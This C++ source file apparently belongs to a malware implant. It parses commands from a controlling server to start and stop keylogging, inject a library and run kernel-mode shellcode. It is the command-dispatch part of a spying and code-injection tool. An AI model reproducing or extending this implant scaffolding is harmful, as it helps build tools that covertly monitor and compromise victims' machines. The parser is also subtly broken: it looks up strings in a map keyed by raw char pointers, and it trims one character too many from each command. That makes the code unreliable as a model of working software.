#include "pch.h"
#include "ParseServerCommand.h"


const std::map<const char*, ServerCommand> STRING_2_COMMAND = {
	{"start_keylogging", StartKeylogging},
	{"end_keylogging", EndKeylogging},
	{"inject_lib", InjectLibrary},
	{"run_km", RunKmShellcode}
};

ServerCommand ParseCommandFromString(const std::string& String) {
	if (STRING_2_COMMAND.find(String.c_str()) == STRING_2_COMMAND.end()) {
		throw std::runtime_error("Failed to find matching server command");
	}
	return (*STRING_2_COMMAND.find(String.c_str())).second;
}


ServerCommand ParseCommand(const std::string& Command, std::string* Output ) {
	size_t pos = 0;
	if ((pos = Command.find('\n')) == std::string::npos || pos == 0)
		throw std::runtime_error("Failed to find newline in server command");

	auto commandString = Command.substr(0, pos - 1);
	auto command = ParseCommandFromString(commandString);
	size_t afterCommandPos = 0;
	if ((afterCommandPos = Command.find('\n', pos + 1)) != std::string::npos) {
		*Output = Command.substr(afterCommandPos);
	}
	return command;
}
